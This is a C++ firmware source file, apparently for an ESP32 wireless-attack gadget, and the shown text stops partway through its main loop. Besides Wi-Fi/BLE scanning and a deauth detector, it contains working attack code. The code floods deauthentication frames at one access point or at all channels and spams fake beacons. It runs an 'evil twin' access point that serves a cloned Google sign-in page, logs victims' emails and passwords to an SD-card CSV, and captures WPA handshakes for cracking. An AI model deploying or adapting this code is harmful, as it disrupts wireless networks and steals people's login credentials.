#include "recon_service.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <NimBLEDevice.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>
#include <FS.h>
#include <time.h>
#include "../web/web_server.h"

#define MAX_WIFI_RESULTS 30
#define MAX_BLE_RESULTS  30
#define DEAUTH_BURST_COUNT 10
#define DEAUTH_BURST_INTERVAL_MS 50

static ReconWiFi wifi_results[MAX_WIFI_RESULTS];
static int wifi_count = 0;

static BleDevice ble_results[MAX_BLE_RESULTS];
static int ble_count = 0;

static volatile bool flag_wifi_scan = false;
static volatile bool flag_ble_scan = false;
static volatile bool flag_deauth = false;
static volatile bool flag_deauth_all = false;
static volatile bool flag_sniffer = false;
static volatile bool flag_deauth_detect = false;
static volatile bool flag_stop = false;

static volatile int ble_scan_duration = 10;

static int sniffer_channel = 0;
static int sniffer_packets = 0;
static int deauth_detected_count = 0;
static bool sniffer_hopping = false;
static uint32_t sniffer_hop_time = 0;
static bool was_web_server_active = false;

static char beacon_ssids[BEACON_SSID_COUNT][BEACON_SSID_LEN];
static int beacon_ssid_count = 0;
static uint32_t beacon_last_send_ms = 0;
static volatile bool flag_beacon_spam = false;

static char et_ssid[33] = "";
static int et_channel = 6;
static char et_target_bssid[18] = "";
static char et_html_file_path[128] = "";
static char et_last_credential[256] = "";
static volatile bool et_new_cred = false;
static volatile bool flag_evil_twin = false;
static uint32_t et_deauth_last_ms = 0;

static DNSServer* dnsServer = nullptr;
static AsyncWebServer* etServer = nullptr;

static volatile bool bitgotchi_active = false;
static volatile bool flag_bitgotchi_start = false;
static volatile bool flag_bitgotchi_stop = false;
static int bitgotchi_friends = 0;
static int bitgotchi_handshakes = 0;
static char bitgotchi_last_event[128] = "Initializing...";
static volatile bool bitgotchi_new_event = false;
static uint32_t bitgotchi_hop_ms = 0;
static uint32_t bitgotchi_beacon_ms = 0;
static uint8_t bitgotchi_ch_idx = 0;
static const uint8_t bitgotchi_channels[] = {1, 6, 11};
static const uint8_t PWNGRID_MAC[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};

static const uint8_t PWNGRID_BEACON_HDR[] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x11, 0x04
};

static void bitgotchi_write_pcap(const char* bssid_str, const uint8_t* frame, uint16_t len) {
    if (!SD.begin()) return;
    if (!SD.exists("/Bitpcap")) SD.mkdir("/Bitpcap");
    if (!SD.exists("/Bitpcap/handshakes")) SD.mkdir("/Bitpcap/handshakes");

    char path[80];
    char safe_bssid[18];
    strncpy(safe_bssid, bssid_str, sizeof(safe_bssid));
    for (int i = 0; i < (int)strlen(safe_bssid); i++) {
        if (safe_bssid[i] == ':') safe_bssid[i] = '-';
    }
    snprintf(path, sizeof(path), "/Bitpcap/handshakes/%s.pcap", safe_bssid);

    bool is_new = !SD.exists(path);
    File f = SD.open(path, FILE_APPEND);
    if (!f) return;

    if (is_new) {
        uint8_t hdr[24];
        uint32_t magic = 0xa1b2c3d4;
        uint16_t vmaj = 2, vmin = 4;
        int32_t  tz = 0;
        uint32_t sigfigs = 0, snaplen = 65535, network = 105;
        memcpy(hdr +  0, &magic,   4);
        memcpy(hdr +  4, &vmaj,    2);
        memcpy(hdr +  6, &vmin,    2);
        memcpy(hdr +  8, &tz,      4);
        memcpy(hdr + 12, &sigfigs, 4);
        memcpy(hdr + 16, &snaplen, 4);
        memcpy(hdr + 20, &network, 4);
        f.write(hdr, 24);
    }

    uint32_t ts_sec = (uint32_t)time(nullptr);
    uint32_t ts_usec = 0;
    uint32_t incl_len = len;
    uint32_t orig_len = len;
    uint8_t pkt_hdr[16];
    memcpy(pkt_hdr +  0, &ts_sec,   4);
    memcpy(pkt_hdr +  4, &ts_usec,  4);
    memcpy(pkt_hdr +  8, &incl_len, 4);
    memcpy(pkt_hdr + 12, &orig_len, 4);
    f.write(pkt_hdr, 16);
    f.write(frame, len);
    f.close();
}

static bool bitgotchi_is_eapol(const uint8_t* frame, uint16_t len) {
    if (len < 36) return false;
    uint8_t type    = (frame[0] & 0x0C) >> 2;
    uint8_t subtype = (frame[0] & 0xF0) >> 4;
    if (type != 2) return false;
    if (subtype == 0  && len > 32 && frame[30] == 0x88 && frame[31] == 0x8E) return true;
    if (subtype == 8  && len > 34 && frame[32] == 0x88 && frame[33] == 0x8E) return true;
    return false;
}

static void bitgotchi_send_pwngrid_beacon(void) {
    const char* payload = "{\"name\":\"Bitgotchi\",\"face\":\"(^_^)\",\"version\":\"1.0.0\",\"grid_version\":\"1.10.3\",\"epoch\":1,\"identity\":\"bitgotchi_scr_terminal\",\"pwnd_run\":0,\"pwnd_tot\":0}";
    uint16_t plen = strlen(payload);
    uint8_t tag_len = (plen > 255) ? 255 : plen;

    size_t frame_len = sizeof(PWNGRID_BEACON_HDR) + 2 + plen;
    uint8_t* frame = (uint8_t*)malloc(frame_len);
    if (!frame) return;

    memcpy(frame, PWNGRID_BEACON_HDR, sizeof(PWNGRID_BEACON_HDR));
    int idx = sizeof(PWNGRID_BEACON_HDR);
    frame[idx++] = 0xDE;
    frame[idx++] = tag_len;
    memcpy(frame + idx, payload, tag_len);

    esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
    free(frame);
}

static int blackout_current_ch = 1;
static uint32_t blackout_ch_time = 0;

static char deauth_bssid[18] = {0};
static int  deauth_channel = 1;

enum ReconState {
    RECON_IDLE,
    RECON_WIFI_SCANNING,
    RECON_BLE_SCANNING,
    RECON_DEAUTH_ACTIVE,
    RECON_DEAUTH_SENDING,
    RECON_DEAUTH_RESTORE,
    RECON_DEAUTH_ALL,
    RECON_SNIFFING,
    RECON_DEAUTH_DETECTING,
    RECON_EVIL_TWIN,
    RECON_BEACON_SPAMMING
};
static ReconState state = RECON_IDLE;

static uint32_t deauth_last_burst_ms = 0;
static int deauth_frames_sent = 0;

static NimBLEScan* pBLEScan = nullptr;
static bool ble_scan_started = false;
static uint32_t ble_scan_start_ms = 0;
static int ble_scan_target_duration = 10;

static bool wifi_scan_requested = false;

static uint8_t deauth_frame[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

const char* DEFAULT_GOOGLE_HTML = 
"<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<style>body{font-family:Arial,sans-serif;background-color:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;height:100vh;box-sizing:border-box;}"
".container{width:100%;max-width:360px;border:1px solid #dadce0;border-radius:8px;padding:40px 24px;text-align:center;}"
"h2{font-weight:400;margin-bottom:8px;color:#202124;}"
"p{color:#5f6368;font-size:16px;margin-bottom:30px;}"
"input[type=text],input[type=password]{width:100%;padding:14px;margin:8px 0;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;font-size:16px;}"
"input:focus{border-color:#1a73e8;outline:none;}"
"button{background-color:#1a73e8;color:white;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;width:100%;margin-top:20px;}"
"button:hover{background-color:#1557b0;}</style></head><body>"
"<div class='container'><img src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg' style='height:24px;margin-bottom:24px;' alt='Google'>"
"<h2>Sign in</h2><p>to continue to Gmail</p>"
"<form action='/login' method='POST'>"
"<input type='text' name='email' placeholder='Email or phone' required>"
"<input type='password' name='password' placeholder='Enter your password' required>"
"<button type='submit'>Next</button></form></div></body></html>";

static void parse_bssid(const char* str, uint8_t* out) {
    unsigned int b[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    }
}

static const char* auth_type_str(wifi_auth_mode_t auth) {
    switch (auth) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "OTHER";
    }
}

static bool check_is_airtag(const NimBLEAdvertisedDevice* dev) {
    if (!dev->haveManufacturerData()) return false;
    auto mfg = dev->getManufacturerData();
    if (mfg.size() < 3) return false;

    if ((uint8_t)mfg[0] == 0x4C && (uint8_t)mfg[1] == 0x00) {
        uint8_t type = (uint8_t)mfg[2];
        if (type == 0x12 || type == 0x07) return true;
    }
    return false;
}

static bool check_is_flipper(const NimBLEAdvertisedDevice* dev) {
    if (dev->haveName()) {
        std::string name = dev->getName();
        std::string name_lower = name;
        for (auto &c : name_lower) c = tolower(c);
        if (name_lower.find("flipper") != std::string::npos) {
            return true;
        }
    }
    return false;
}

class ReconBLECallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (ble_count >= MAX_BLE_RESULTS) return;

        std::string addr_str = dev->getAddress().toString();
        const char* addr = addr_str.c_str();

        for (int i = 0; i < ble_count; i++) {
            if (strcmp(ble_results[i].mac, addr) == 0) return;
        }

        BleDevice& d = ble_results[ble_count];
        strncpy(d.mac, addr, sizeof(d.mac) - 1);
        d.mac[sizeof(d.mac) - 1] = '\0';

        if (dev->haveName()) {
            std::string nm = dev->getName();
            strncpy(d.name, nm.c_str(), sizeof(d.name) - 1);
            d.name[sizeof(d.name) - 1] = '\0';
        } else {
            d.name[0] = '\0';
        }

        d.rssi = dev->getRSSI();
        d.is_airtag = check_is_airtag(dev);
        d.is_flipper = check_is_flipper(dev);

        ble_count++;

        Serial.printf("[RECON] BLE: %s \"%s\" RSSI:%d %s %s\n",
                      d.mac, d.name, d.rssi, 
                      d.is_airtag ? "[AIRTAG]" : "",
                      d.is_flipper ? "[FLIPPER]" : "");
    }
};

static ReconBLECallbacks bleScanCB;

void recon_service_init(void) {
    Serial.println("[RECON] Service initialized");
}

void recon_request_wifi_scan(void) {
    flag_wifi_scan = true;
}

void recon_request_ble_scan(int duration_sec) {
    ble_scan_duration = duration_sec;
    flag_ble_scan = true;
}

void recon_request_deauth(const char* bssid, int channel) {
    strncpy(deauth_bssid, bssid, sizeof(deauth_bssid) - 1);
    deauth_bssid[sizeof(deauth_bssid) - 1] = '\0';
    deauth_channel = channel;
    flag_deauth = true;
}

void recon_request_stop(void) {
    flag_stop = true;
}

bool recon_is_scanning(void) {
    return state == RECON_WIFI_SCANNING || state == RECON_BLE_SCANNING;
}

bool recon_is_deauthing(void) {
    return state == RECON_DEAUTH_ACTIVE || state == RECON_DEAUTH_SENDING || state == RECON_DEAUTH_RESTORE;
}

int recon_wifi_count(void) {
    return wifi_count;
}

int recon_ble_count(void) {
    return ble_count;
}

const ReconWiFi* recon_get_wifi(int idx) {
    if (idx < 0 || idx >= wifi_count) return nullptr;
    return &wifi_results[idx];
}

const BleDevice* recon_get_ble(int idx) {
    if (idx < 0 || idx >= ble_count) return nullptr;
    return &ble_results[idx];
}

static void start_wifi_scan(void) {
    Serial.println("[RECON] Starting WiFi scan (AP_STA mode)");
    wifi_count = 0;
    WiFi.scanNetworks(true);
    wifi_scan_requested = true;
    state = RECON_WIFI_SCANNING;
}

static void poll_wifi_scan(void) {
    int16_t result = WiFi.scanComplete();
    if (result == WIFI_SCAN_RUNNING) return;

    if (result == WIFI_SCAN_FAILED) {
        Serial.println("[RECON] WiFi scan failed");
        state = RECON_IDLE;
        wifi_scan_requested = false;
        return;
    }

    int n = (result > MAX_WIFI_RESULTS) ? MAX_WIFI_RESULTS : result;
    for (int i = 0; i < n; i++) {
        ReconWiFi& net = wifi_results[i];
        strncpy(net.ssid, WiFi.SSID(i).c_str(), sizeof(net.ssid) - 1);
        net.ssid[sizeof(net.ssid) - 1] = '\0';
        snprintf(net.bssid, sizeof(net.bssid), "%s", WiFi.BSSIDstr(i).c_str());
        net.rssi = WiFi.RSSI(i);
        net.channel = WiFi.channel(i);
        strncpy(net.auth, auth_type_str(WiFi.encryptionType(i)), sizeof(net.auth) - 1);
        net.auth[sizeof(net.auth) - 1] = '\0';
    }
    wifi_count = n;
    WiFi.scanDelete();
    wifi_scan_requested = false;
    state = RECON_IDLE;
    Serial.printf("[RECON] WiFi scan complete: %d networks\n", wifi_count);
}

static void start_ble_scan(void) {
    Serial.println("[RECON] Starting BLE scan");
    ble_count = 0;

    if (!NimBLEDevice::isInitialized()) {
        NimBLEDevice::init("SCR-Scan");
    }

    pBLEScan = NimBLEDevice::getScan();
    pBLEScan->setScanCallbacks(&bleScanCB, false);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);

    ble_scan_target_duration = ble_scan_duration;
    pBLEScan->start(ble_scan_target_duration * 1000, false);
    ble_scan_started = true;
    ble_scan_start_ms = millis();
    state = RECON_BLE_SCANNING;
}

static void poll_ble_scan(void) {
    if (!pBLEScan) {
        state = RECON_IDLE;
        return;
    }
    if (!pBLEScan->isScanning()) {
        ble_scan_started = false;
        state = RECON_IDLE;
        Serial.printf("[RECON] BLE scan complete: %d devices\n", ble_count);
    }
}

static void stop_ble_scan(void) {
    if (pBLEScan && pBLEScan->isScanning()) {
        pBLEScan->stop();
    }
    ble_scan_started = false;
}

static void start_deauth(void) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Starting deauth: BSSID=%s CH=%d\n", deauth_bssid, deauth_channel);

    uint8_t bssid_bytes[6];
    parse_bssid(deauth_bssid, bssid_bytes);
    memcpy(deauth_frame + 10, bssid_bytes, 6);
    memcpy(deauth_frame + 16, bssid_bytes, 6);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);

    deauth_frames_sent = 0;
    deauth_last_burst_ms = 0;
    state = RECON_DEAUTH_SENDING;
}

static void poll_deauth(void) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms < DEAUTH_BURST_INTERVAL_MS) return;
    deauth_last_burst_ms = now;

    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
    deauth_frames_sent += DEAUTH_BURST_COUNT;
}

static void stop_deauth_and_restore(void) {
    Serial.printf("[RECON] Deauth stopped. Restoring state...\n");
    esp_wifi_set_promiscuous(false);
    if (was_web_server_active) {
        WiFi.mode(WIFI_AP_STA);
        web_server_init();
    } else {
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
    }
    deauth_frames_sent = 0;
    state = RECON_IDLE;
}

static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len   = pkt->rx_ctrl.sig_len;

    if (type == WIFI_PKT_MGMT) {
        uint8_t subtype = (frame[0] >> 4) & 0x0F;
        sniffer_packets++;
        if (subtype == 0x0C || subtype == 0x0A) deauth_detected_count++;

        
        if (bitgotchi_active && subtype == 0x08 && len > 16) {
            if (memcmp(frame + 10, PWNGRID_MAC, 6) == 0) {
                bitgotchi_friends++;
                snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event),
                         "Friend detected! Total: %d", bitgotchi_friends);
                bitgotchi_new_event = true;
            }
        }
    }

    
    if (bitgotchi_active && (type == WIFI_PKT_DATA || type == WIFI_PKT_MGMT)) {
        if (bitgotchi_is_eapol(frame, len)) {
            char bssid_str[18];
            snprintf(bssid_str, sizeof(bssid_str),
                "%02X-%02X-%02X-%02X-%02X-%02X",
                frame[10], frame[11], frame[12],
                frame[13], frame[14], frame[15]);
            bitgotchi_write_pcap(bssid_str, frame, len);
            bitgotchi_handshakes++;
            snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event),
                     "PCAP Saved! BSSID:%s", bssid_str);
            bitgotchi_new_event = true;
            Serial.printf("[BITGOTCHI] Handshake captured & saved: %s\n", bssid_str);
        }
    }
}

static void start_deauth_all(void) {
    was_web_server_active = web_server_is_active();
    Serial.println("[RECON] Blackout: deauth all channels");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    blackout_current_ch = 1;
    blackout_ch_time = millis();
    deauth_frames_sent = 0;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    memset(deauth_frame + 4, 0xFF, 6);
    memset(deauth_frame + 10, 0xFF, 6);
    memset(deauth_frame + 16, 0xFF, 6);

    state = RECON_DEAUTH_ALL;
}

static void poll_deauth_all(void) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms < 30) return;
    deauth_last_burst_ms = now;

    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
    deauth_frames_sent += 5;

    if (now - blackout_ch_time > 500) {
        blackout_current_ch++;
        if (blackout_current_ch > 13) blackout_current_ch = 1;
        esp_wifi_set_channel(blackout_current_ch, WIFI_SECOND_CHAN_NONE);
        blackout_ch_time = now;
    }
}

static void start_sniffer(int ch) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Sniffer starting CH=%d\n", ch);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    sniffer_packets = 0;
    deauth_detected_count = 0;
    sniffer_hopping = (ch == 0);
    sniffer_channel = (ch == 0) ? 1 : ch;
    esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_hop_time = millis();
    state = RECON_SNIFFING;
}

static void poll_sniffer(void) {
    if (!sniffer_hopping) return;
    if (millis() - sniffer_hop_time > 200) {
        sniffer_channel++;
        if (sniffer_channel > 13) sniffer_channel = 1;
        esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
        sniffer_hop_time = millis();
    }
}

static void start_deauth_detect(void) {
    was_web_server_active = web_server_is_active();
    Serial.println("[RECON] Deauth detector starting");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    deauth_detected_count = 0;
    sniffer_packets = 0;
    sniffer_hopping = true;
    sniffer_channel = 1;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    sniffer_hop_time = millis();
    state = RECON_DEAUTH_DETECTING;
}

static void send_beacon(const char* ssid, uint8_t ch) {
    uint32_t hash = 5381;
    for (int i = 0; ssid[i] != '\0'; i++) {
        hash = ((hash << 5) + hash) + ssid[i];
    }
    uint8_t mac[6];
    mac[0] = 0x02;
    mac[1] = 0xDE;
    mac[2] = (hash & 0xFF000000) >> 24;
    mac[3] = (hash & 0x00FF0000) >> 16;
    mac[4] = (hash & 0x0000FF00) >> 8;
    mac[5] = (hash & 0x000000FF);

    uint8_t packet[128];
    int idx = 0;

    packet[idx++] = 0x80; packet[idx++] = 0x00;
    packet[idx++] = 0x00; packet[idx++] = 0x00;
    memset(packet + idx, 0xFF, 6); idx += 6;
    memcpy(packet + idx, mac, 6); idx += 6;
    memcpy(packet + idx, mac, 6); idx += 6;
    packet[idx++] = 0x00; packet[idx++] = 0x00;

    memset(packet + idx, 0, 8); idx += 8;
    packet[idx++] = 0x64; packet[idx++] = 0x00;
    packet[idx++] = 0x11; packet[idx++] = 0x04;

    packet[idx++] = 0x00;
    uint8_t len = strlen(ssid);
    packet[idx++] = len;
    memcpy(packet + idx, ssid, len); idx += len;

    packet[idx++] = 0x01; packet[idx++] = 0x08;
    packet[idx++] = 0x82; packet[idx++] = 0x84; packet[idx++] = 0x8b; packet[idx++] = 0x96;
    packet[idx++] = 0x24; packet[idx++] = 0x30; packet[idx++] = 0x48; packet[idx++] = 0x6c;

    packet[idx++] = 0x03; packet[idx++] = 0x01;
    packet[idx++] = ch;

    esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

void recon_request_beacon_spam(const char ssids[][BEACON_SSID_LEN], int count) {
    beacon_ssid_count = (count > BEACON_SSID_COUNT) ? BEACON_SSID_COUNT : count;
    for (int i = 0; i < beacon_ssid_count; i++) {
        strncpy(beacon_ssids[i], ssids[i], BEACON_SSID_LEN - 1);
        beacon_ssids[i][BEACON_SSID_LEN - 1] = '\0';
    }
    flag_beacon_spam = true;
}

static void start_beacon_spam(void) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Starting Beacon Spam: %d SSIDs\n", beacon_ssid_count);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    esp_wifi_set_promiscuous(false);
    beacon_last_send_ms = 0;
    state = RECON_BEACON_SPAMMING;
}

static void poll_beacon_spam(void) {
    uint32_t now = millis();
    if (now - beacon_last_send_ms < 100) return;
    beacon_last_send_ms = now;
    for (int i = 0; i < beacon_ssid_count; i++) {
        send_beacon(beacon_ssids[i], 1);
    }
}

void recon_request_evil_twin(const char* ssid, int channel) {
    recon_request_evil_twin_full(ssid, channel, "", "");
}

void recon_request_evil_twin_full(const char* ssid, int channel,
                                   const char* bssid,
                                   const char* html_path) {
    if (ssid) {
        strncpy(et_ssid, ssid, sizeof(et_ssid) - 1);
        et_ssid[sizeof(et_ssid) - 1] = '\0';
    } else {
        et_ssid[0] = '\0';
    }
    et_channel = channel;
    if (bssid) {
        strncpy(et_target_bssid, bssid, sizeof(et_target_bssid) - 1);
        et_target_bssid[sizeof(et_target_bssid) - 1] = '\0';
    } else {
        et_target_bssid[0] = '\0';
    }
    if (html_path) {
        strncpy(et_html_file_path, html_path, sizeof(et_html_file_path) - 1);
        et_html_file_path[sizeof(et_html_file_path) - 1] = '\0';
    } else {
        et_html_file_path[0] = '\0';
    }
    flag_evil_twin = true;
}

static void start_evil_twin_server(void) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Starting Evil Twin server for \"%s\" on CH%d\n", et_ssid, et_channel);
    web_server_stop();
    delay(200);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(et_ssid, NULL, et_channel);

    dnsServer = new DNSServer();
    dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));

    etServer = new AsyncWebServer(80);

    etServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (strlen(et_html_file_path) > 0 && SD.exists(et_html_file_path)) {
            request->send(SD, et_html_file_path, "text/html");
        } else {
            request->send(200, "text/html", DEFAULT_GOOGLE_HTML);
        }
    });

    etServer->on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String email = "";
        String pass = "";
        if (request->hasParam("email", true)) email = request->getParam("email", true)->value();
        if (request->hasParam("password", true)) pass = request->getParam("password", true)->value();

        if (email.length() > 0 && pass.length() > 0) {
            Serial.printf("[EVIL TWIN] captured: %s / %s\n", email.c_str(), pass.c_str());
            snprintf(et_last_credential, sizeof(et_last_credential), "%s:%s", email.c_str(), pass.c_str());
            et_new_cred = true;

            File csv = SD.open("/evil.csv", FILE_APPEND);
            if (csv) {
                csv.printf("%u,%s,%s,%s\n", (uint32_t)(millis()/1000), et_ssid, email.c_str(), pass.c_str());
                csv.close();
            }
        }
        request->send(200, "text/html", "<h2>Authentication Error</h2><p>Please try again later.</p>");
    });

    etServer->onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1/");
    });

    etServer->begin();

    
    uint8_t bssid_bytes[6];
    parse_bssid(et_target_bssid, bssid_bytes);
    memcpy(deauth_frame + 10, bssid_bytes, 6);
    memcpy(deauth_frame + 16, bssid_bytes, 6);

    et_deauth_last_ms = 0;
    deauth_frames_sent = 0;
    state = RECON_EVIL_TWIN;
}

static void poll_evil_twin(void) {
    if (dnsServer) {
        dnsServer->processNextRequest();
    }

    uint32_t now = millis();
    if (strlen(et_target_bssid) > 0 && (now - et_deauth_last_ms > 100)) {
        et_deauth_last_ms = now;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(et_channel, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 5; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        }
        deauth_frames_sent += 5;
        esp_wifi_set_promiscuous(false);
    }
}

static void stop_evil_twin(void) {
    Serial.println("[RECON] Stopping Evil Twin");
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    if (etServer) {
        etServer->end();
        delete etServer;
        etServer = nullptr;
    }
    WiFi.softAPdisconnect(true);
    if (was_web_server_active) {
        web_server_init();
    } else {
        WiFi.mode(WIFI_OFF);
    }
    state = RECON_IDLE;
}

bool recon_is_evil_twin(void) {
    return state == RECON_EVIL_TWIN;
}

bool recon_is_beacon_spamming(void) {
    return state == RECON_BEACON_SPAMMING;
}

int recon_beacon_active_count(void) {
    return beacon_ssid_count;
}

void recon_request_bitgotchi(bool active) {
    if (active && !bitgotchi_active) flag_bitgotchi_start = true;
    if (!active && bitgotchi_active)  flag_bitgotchi_stop  = true;
}

bool recon_is_bitgotchi_active(void)    { return bitgotchi_active; }
int  recon_bitgotchi_friends_count(void){ return bitgotchi_friends; }
int  recon_bitgotchi_handshakes_count(void){ return bitgotchi_handshakes; }
const char* recon_bitgotchi_last_event(void) { return bitgotchi_last_event; }
bool recon_bitgotchi_has_new_event(void) {
    bool r = bitgotchi_new_event;
    bitgotchi_new_event = false;
    return r;
}

const char* recon_et_last_cred(void) {
    return et_last_credential;
}

bool recon_et_has_new_cred(void) {
    bool r = et_new_cred;
    et_new_cred = false;
    return r;
}

void recon_request_deauth_all(void) {
    flag_deauth_all = true;
}

void recon_request_sniffer(int channel) {
    sniffer_channel = channel;
    flag_sniffer = true;
}

void recon_request_deauth_detect(void) {
    flag_deauth_detect = true;
}

int recon_deauth_detect_count(void) {
    return deauth_detected_count;
}

bool recon_is_sniffing(void) {
    return state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING;
}

int recon_sniffer_packet_count(void) {
    return sniffer_packets;
}

void recon_service_loop(void) {
    if (flag_stop) {
        flag_stop = false;
        flag_wifi_scan = false;
        flag_ble_scan = false;
        flag_deauth = false;
        flag_deauth_all = false;
        flag_sniffer = false;
        flag_deauth_detect = false;
        flag_beacon_spam = false;
        flag_evil_twin = false;

        if (state == RECON_WIFI_SCANNING) {
            WiFi.scanDelete();
            wifi_scan_requested = false;
        } else if (state == RECON_BLE_SCANNING) {
            stop_ble_scan();
        } else if (state == RECON_DEAUTH_SENDING || state == RECON_DEAUTH_ACTIVE || state == RECON_DEAUTH_ALL) {
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING) {
            esp_wifi_set_promiscuous(false);
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_EVIL_TWIN) {
            stop_evil_twin();
            return;
        } else if (state == RECON_BEACON_SPAMMING) {
            WiFi.softAPdisconnect(true);
            stop_deauth_and_restore();
            return;
        }
        state = RECON_IDLE;
        Serial.println("[RECON] Stopped");
        return;
    }

    if (state == RECON_IDLE) {
        if (flag_wifi_scan) {
            flag_wifi_scan = false;
            start_wifi_scan();
            return;
        }
        if (flag_ble_scan) {
            flag_ble_scan = false;
            start_ble_scan();
            return;
        }
        if (flag_deauth) {
            flag_deauth = false;
            start_deauth();
            return;
        }
        if (flag_deauth_all) {
            flag_deauth_all = false;
            start_deauth_all();
            return;
        }
        if (flag_sniffer) {
            flag_sniffer = false;
            start_sniffer(sniffer_channel);
            return;
        }
        if (flag_deauth_detect) {
            flag_deauth_detect = false;
            start_deauth_detect();
            return;
        }
        if (flag_beacon_spam) {
            flag_beacon_spam = false;
            start_beacon_spam();
            return;
        }
        if (flag_evil_twin) {
            flag_evil_twin = false;
            start_evil_twin_server();
            return;
        }
    }

    switch (state) {
        case RECON_WIFI_SCANNING:
            poll_wifi_scan();
            break;
        case RECON_BLE_SCANNING:
            poll_ble_scan();
            break;
        case RECON_DEAUTH_SENDING:
            poll_deauth();
            break;
        case RECON_DEAUTH_ALL:
            poll_deauth_all();
            break;
        case RECON_SNIFFING:
            poll_sniffer();
            break;
        case RECON_DEAUTH_DETECTING:
            poll_sniffer();
            break;
        case RECON_BEACON_SPAMMING:
            poll_beacon_spam();
            break;
        case RECON_EVIL_TWIN:
            poll_evil_twin();
            break;
        default:
            break;
    }

    
    if (flag_bitgotchi_start) {
        flag_bitgotchi_start = false;
        bitgotchi_active = true;
        bitgotchi_friends = 0;
        bitgotchi_handshakes = 0;
        bitgotchi_ch_idx = 0;
        bitgotchi_hop_ms = 0;
        bitgotchi_beacon_ms = 0;
        snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event), "Started.");
        bitgotchi_new_event = true;
        WiFi.mode(WIFI_AP_STA);
